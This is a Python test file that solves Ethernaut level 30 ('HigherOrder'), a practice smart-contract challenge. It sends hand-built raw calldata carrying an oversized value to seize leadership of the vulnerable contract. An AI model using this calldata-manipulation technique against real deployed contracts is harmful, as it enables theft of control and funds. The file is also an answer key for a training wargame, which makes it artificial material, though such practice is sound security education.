from wake.testing import *
from tests.ethernaut_deployer import EthernautDeployer
from pytypes.contracts.lv30_higher_order import HigherOrder

@default_chain.connect()
def test_lv30():
    ethernaut = EthernautDeployer(default_chain)
    contract = ethernaut.deploy_lv30()
    exploit_lv30(contract)
    ethernaut.check_lv30(contract)

def exploit_lv30(contract: HigherOrder):
    # Attack vector: Call data are read in raw form
    # Training: know how to call function by calldata and pass bigger sized data

    # function selector + maximal 32B value
    calldata = HigherOrder.registerTreasury.selector.hex() + "f" * 64 
    contract.transact(bytes.fromhex(calldata))
    contract.claimLeadership()
